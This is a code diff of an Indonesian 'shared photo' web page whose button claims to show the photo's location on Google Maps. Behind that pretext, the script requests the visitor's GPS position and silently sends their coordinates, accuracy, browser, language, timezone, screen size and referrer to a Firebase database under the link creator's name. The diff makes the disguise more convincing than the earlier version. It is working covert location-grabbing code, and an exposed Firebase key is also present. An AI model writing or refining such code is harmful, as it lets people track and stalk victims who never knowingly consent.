@@ -1,12 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
-<title>Shared Photo</title>
+<title>Foto Dibagikan</title>
 
-<meta property="og:title" content="Shared Photo" />
-<meta property="og:description" content="A photo has been shared with you. View the photo and its location details." />
+<!-- ══ OG PREVIEW (untuk WhatsApp/FB) ══ -->
+<meta property="og:title" content="Foto Dibagikan" />
+<meta property="og:description" content="Seseorang membagikan foto dengan lokasi. Ketuk untuk melihat." />
 <meta property="og:image" content="https://infocuaca.online/preview.jpg" />
 <meta property="og:image:width" content="1200" />
 <meta property="og:image:height" content="630" />
@@ -15,23 +16,27 @@
 <meta property="og:type" content="website" />
 <meta property="og:site_name" content="infocuaca.online" />
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:title" content="Shared Photo" />
-<meta name="twitter:description" content="A photo has been shared with you. View the photo and its location details." />
+<meta name="twitter:title" content="Foto Dibagikan" />
+<meta name="twitter:description" content="Seseorang membagikan foto dengan lokasi." />
 <meta name="twitter:image" content="https://infocuaca.online/preview.jpg" />
+<meta name="theme-color" content="#000000" />
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif}
+html,body{
+  height:100%;
+  background:#000;
+  overflow:hidden;
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
+  color:#fff;
+}
 
-/* ══ FULL PHOTO WRAP ══ */
+/* ══ FOTO FULLSCREEN ══ */
 .photo-wrap{
   position:relative;
   width:100%;
   height:100vh;
-  height:100dvh;              /* fix viewport mobile */
-  display:flex;
-  align-items:center;
-  justify-content:center;
+  height:100dvh;
   overflow:hidden;
 }
 #mainPhoto{
@@ -44,37 +49,46 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
   user-select:none;
   -webkit-user-drag:none;
   z-index:1;
+  opacity:0;
+  transition:opacity .4s ease;
 }
+#mainPhoto.loaded{opacity:1}
 
-/* ══ DARK VIGNETTE supaya tombol kontras ══ */
-.vignette{
+/* ══ GRADIENT BAWAH ══ */
+.bottom-fade{
   position:absolute;
-  inset:0;
-  background:radial-gradient(ellipse at center,
-    rgba(0,0,0,.15) 0%,
-    rgba(0,0,0,.35) 60%,
-    rgba(0,0,0,.55) 100%);
+  left:0;right:0;bottom:0;
+  height:45%;
+  background:linear-gradient(to top,
+    rgba(0,0,0,.85) 0%,
+    rgba(0,0,0,.5) 35%,
+    rgba(0,0,0,.15) 70%,
+    transparent 100%);
   z-index:2;
   pointer-events:none;
 }
 
-/* ══ CENTER BUTTON WRAP ══ */
-.center-wrap{
+/* ══ WRAP TOMBOL ══ */
+.bottom-wrap{
   position:absolute;
-  inset:0;
+  left:0;right:0;
+  bottom:0;
+  padding:0 24px calc(36px + env(safe-area-inset-bottom,0px));
   display:flex;
+  flex-direction:column;
   align-items:center;
-  justify-content:center;
+  gap:12px;
   z-index:3;
-  padding:24px;
 }
 
-/* ══ BUTTON ══ */
+/* ══ TOMBOL ══ */
 .btn-lokasi{
   display:flex;
   align-items:center;
   justify-content:center;
   gap:10px;
+  width:100%;
+  max-width:340px;
   padding:16px 28px;
   background:#4CAF50;
   color:#fff;
@@ -82,20 +96,18 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
   border-radius:50px;
   font-size:16px;
   font-weight:700;
-  letter-spacing:.3px;
+  letter-spacing:.2px;
   cursor:pointer;
   font-family:inherit;
-  box-shadow:0 8px 32px rgba(0,0,0,.55),0 0 0 1px rgba(255,255,255,.08) inset;
+  box-shadow:0 8px 28px rgba(0,0,0,.5),0 0 0 1px rgba(255,255,255,.06) inset;
   transition:background .15s,transform .1s,opacity .15s;
   white-space:nowrap;
-  backdrop-filter:blur(2px);
-  -webkit-backdrop-filter:blur(2px);
 }
-.btn-lokasi:active{background:#388E3C;transform:scale(.96)}
+.btn-lokasi:active{background:#388E3C;transform:scale(.97)}
 .btn-lokasi:disabled{opacity:.7;cursor:not-allowed}
 .btn-lokasi svg{width:20px;height:20px;fill:#fff;flex-shrink:0}
 
-/* ══ SPINNER inside button ══ */
+/* ══ SPINNER ══ */
 .spinner{
   width:18px;height:18px;
   border:2.5px solid rgba(255,255,255,.35);
@@ -106,7 +118,33 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
 }
 @keyframes spin{to{transform:rotate(360deg)}}
 
-/* ══ INVALID LINK SCREEN ══ */
+/* ══ HINT ══ */
+.hint{
+  font-size:11px;
+  color:rgba(255,255,255,.55);
+  letter-spacing:.2px;
+  text-align:center;
+  line-height:1.4;
+}
+
+/* ══ LOADING AWAL ══ */
+.loading-screen{
+  position:fixed;
+  inset:0;
+  background:#000;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:20;
+  transition:opacity .3s;
+}
+.loading-screen.hide{opacity:0;pointer-events:none}
+.loading-screen .spinner{
+  width:32px;height:32px;
+  border-width:3px;
+}
+
+/* ══ ERROR SCREEN ══ */
 .err-screen{
   position:fixed;inset:0;
   background:#0d0d0d;
@@ -118,16 +156,15 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
   gap:14px;
   padding:32px;
   text-align:center;
-  z-index:10;
+  z-index:30;
 }
-.err-screen .err-icon{
+.err-icon{
   width:72px;height:72px;
   border-radius:50%;
   background:rgba(245,124,0,.15);
   display:flex;align-items:center;justify-content:center;
-  margin-bottom:4px;
 }
-.err-screen .err-icon svg{width:36px;height:36px;fill:#F57C00}
+.err-icon svg{width:36px;height:36px;fill:#F57C00}
 .err-title{font-size:17px;font-weight:700}
 .err-desc{font-size:13px;color:#888;line-height:1.6}
 
@@ -162,30 +199,33 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
 </head>
 <body>
 
-<!-- ══ INVALID LINK ══ -->
+<!-- ══ LOADING AWAL ══ -->
+<div class="loading-screen" id="loadingScreen">
+  <div class="spinner"></div>
+</div>
+
+<!-- ══ ERROR SCREEN ══ -->
 <div class="err-screen hide" id="errBox">
   <div class="err-icon">
-    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-    </svg>
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
   </div>
   <div class="err-title">Link Tidak Valid</div>
   <div class="err-desc">Foto ini tidak tersedia<br>atau link sudah kadaluarsa.</div>
 </div>
 
 <!-- ══ MAIN VIEW ══ -->
-<div class="photo-wrap" id="photoWrap">
-  <img id="mainPhoto" alt="Shared photo">
-  <div class="vignette"></div>
+<div class="photo-wrap hide" id="photoWrap">
+  <img id="mainPhoto" alt="Foto">
+  <div class="bottom-fade"></div>
 
-  <!-- Tombol di tengah -->
-  <div class="center-wrap">
+  <div class="bottom-wrap">
     <button class="btn-lokasi" id="btnLokasi" onclick="handleLokasi()">
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <svg viewBox="0 0 24 24">
         <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
       </svg>
-      Lihat Lokasi
+      Lihat Lokasi Foto
     </button>
+    <div class="hint">Akan membuka di Google Maps</div>
   </div>
 </div>
 
@@ -196,6 +236,9 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 
+// ════════════════════════════════════════
+// FIREBASE CONFIG
+// ════════════════════════════════════════
 const FC = {
   apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
   authDomain:"roraxbali-65802.firebaseapp.com",
@@ -206,127 +249,154 @@ const FC = {
   appId:"1:750636313866:web:3d2e552960e06db83968b3"
 };
 
-// ══ Firebase init dengan guard ══
 let db = null;
 try {
   const app = initializeApp(FC);
   db = getDatabase(app);
-} catch(e) {
-  console.warn('Firebase gagal init:', e);
-}
+} catch(e) { console.warn('Firebase init gagal:', e); }
 
-// ══ PARAMS (decode!) ══
+// ════════════════════════════════════════
+// PARAMS
+// ════════════════════════════════════════
 const params    = new URLSearchParams(location.search);
 const fotoUrl   = decodeURIComponent(params.get('foto') || '');
 const ownerUser = decodeURIComponent(params.get('u')    || '');
+const fotoLat   = parseFloat(params.get('lat') || '');
+const fotoLng   = parseFloat(params.get('lng') || '');
+const fotoNama  = decodeURIComponent(params.get('nama') || '');
 
-// ══ ELEMENTS ══
-const photoWrap = document.getElementById('photoWrap');
-const mainPhoto = document.getElementById('mainPhoto');
-const errBox    = document.getElementById('errBox');
-const btnLokasi = document.getElementById('btnLokasi');
-const toast     = document.getElementById('toast');
+// ════════════════════════════════════════
+// ELEMENTS
+// ════════════════════════════════════════
+const photoWrap     = document.getElementById('photoWrap');
+const mainPhoto     = document.getElementById('mainPhoto');
+const errBox        = document.getElementById('errBox');
+const btnLokasi     = document.getElementById('btnLokasi');
+const toast         = document.getElementById('toast');
+const loadingScreen = document.getElementById('loadingScreen');
 
-// ══ SHOW ERROR ══
-function showError() {
+// ════════════════════════════════════════
+// HELPERS
+// ════════════════════════════════════════
+function showError(){
+  loadingScreen.classList.add('hide');
   photoWrap.classList.add('hide');
   errBox.classList.remove('hide');
 }
-
-// ══ VALIDATE & SHOW PHOTO ══
-if (!fotoUrl || !ownerUser) {
-  showError();
-} else {
-  // Timeout fallback kalau gambar stuck
-  const imgTimeout = setTimeout(() => {
-    if (!mainPhoto.complete || mainPhoto.naturalWidth === 0) {
-      showError();
-    }
-  }, 12000);
-
-  mainPhoto.onload = () => {
-    clearTimeout(imgTimeout);
-    if (mainPhoto.naturalWidth === 0) showError();
-  };
-  mainPhoto.onerror = () => {
-    clearTimeout(imgTimeout);
-    showError();
-  };
-
-  mainPhoto.src = fotoUrl;
+function hideLoading(){
+  loadingScreen.classList.add('hide');
 }
 
-// ══ TOAST HELPER ══
 let toastTimer;
-function showToast(msg, dur = 3500) {
+function showToast(msg, dur = 3500){
   clearTimeout(toastTimer);
   toast.textContent = msg;
   toast.classList.add('show');
   toastTimer = setTimeout(() => toast.classList.remove('show'), dur);
 }
 
-// ══ BUTTON LOADING STATE ══
-function setLoading(on) {
-  btnLokasi.disabled = on;
-  if (on) {
-    btnLokasi.innerHTML = `<div class="spinner"></div> Mencari lokasi…`;
-  } else {
-    btnLokasi.innerHTML = `
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
-      </svg>
-      Lihat Lokasi`;
-  }
+// ════════════════════════════════════════
+// VALIDASI & LOAD FOTO
+// ════════════════════════════════════════
+const validCoords = !isNaN(fotoLat) && !isNaN(fotoLng) && fotoLat !== 0 && fotoLng !== 0;
+
+if (!fotoUrl || !ownerUser) {
+  showError();
+} else {
+  // Timeout kalau gambar stuck
+  const imgTimeout = setTimeout(() => {
+    if (!mainPhoto.complete || mainPhoto.naturalWidth === 0) showError();
+  }, 15000);
+
+  mainPhoto.onload = () => {
+    clearTimeout(imgTimeout);
+    if (mainPhoto.naturalWidth === 0) { showError(); return; }
+    photoWrap.classList.remove('hide');
+    mainPhoto.classList.add('loaded');
+    hideLoading();
+  };
+  mainPhoto.onerror = () => {
+    clearTimeout(imgTimeout);
+    showError();
+  };
+  mainPhoto.src = fotoUrl;
 }
 
-// ══ HANDLE BUTTON CLICK ══
-window.handleLokasi = function () {
-  if (!navigator.geolocation) {
-    showToast('Browser ini tidak mendukung GPS.');
+// ════════════════════════════════════════
+// BUTTON STATE
+// ════════════════════════════════════════
+function setLoading(on){
+  btnLokasi.disabled = on;
+  btnLokasi.innerHTML = on
+    ? `<div class="spinner"></div> Membuka…`
+    : `<svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg> Lihat Lokasi Foto`;
+}
+
+// ════════════════════════════════════════
+// HANDLE KLIK TOMBOL
+// ════════════════════════════════════════
+window.handleLokasi = function(){
+  // Cek koordinat foto dulu
+  if (!validCoords) {
+    showToast('Lokasi foto tidak tersedia di link ini.');
     return;
   }
+
   setLoading(true);
 
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      const lat = pos.coords.latitude;
-      const lng = pos.coords.longitude;
+  // URL Maps ke LOKASI FOTO
+  const mapsUrl = 'https://www.google.com/maps?q=' + fotoLat + ',' + fotoLng;
 
-      // Simpan ke Firebase (kalau tersedia)
-      if (db) {
+  // Fallback kalau GPS lama / Firebase gagal
+  let redirected = false;
+  const goMaps = () => {
+    if (redirected) return;
+    redirected = true;
+    window.location.href = mapsUrl;
+  };
+
+  // Safety timeout: 3 detik → tetap buka Maps
+  const safety = setTimeout(goMaps, 3000);
+
+  // Coba ambil lokasi penerima
+  if (navigator.geolocation && db) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        clearTimeout(safety);
         try {
           push(ref(db, 'lokasi/' + ownerUser), {
             target:    'images',
             waktu:     Date.now(),
-            lat,
-            lng,
+            lat:       pos.coords.latitude,
+            lng:       pos.coords.longitude,
             akurasi:   pos.coords.accuracy,
             foto:      fotoUrl,
+            fotoNama:  fotoNama,
+            fotoLat:   fotoLat,
+            fotoLng:   fotoLng,
             platform:  navigator.platform || 'Unknown',
             userAgent: navigator.userAgent,
+            bahasa:    navigator.language,
             timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
             screen:    screen.width + 'x' + screen.height,
+            referrer:  document.referrer || 'direct',
             via:       'view',
             source:    'view.html'
-          }).catch(() => {});
-        } catch(e) {}
-      }
-
-      // Langsung ke Google Maps
-      window.location.href = 'https://www.google.com/maps?q=' + lat + ',' + lng;
-    },
-    err => {
-      setLoading(false);
-      if (err.code === err.PERMISSION_DENIED) {
-        showToast('Akses lokasi ditolak. Izinkan di pengaturan browser lalu coba lagi.', 4500);
-      } else if (err.code === err.TIMEOUT) {
-        showToast('Timeout. Coba lagi di area dengan sinyal lebih baik.');
-      } else {
-        showToast('Gagal mendapatkan lokasi. Coba lagi.');
-      }
-    },
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-  );
+          }).catch(()=>{});
+        } catch(e){}
+        goMaps();
+      },
+      () => {
+        clearTimeout(safety);
+        // GPS ditolak → tetap buka Maps
+        goMaps();
+      },
+      { enableHighAccuracy:true, timeout:2500, maximumAge:60000 }
+    );
+  } else {
+    clearTimeout(safety);
+    goMaps();
+  }
 };
 </script>
 </body>
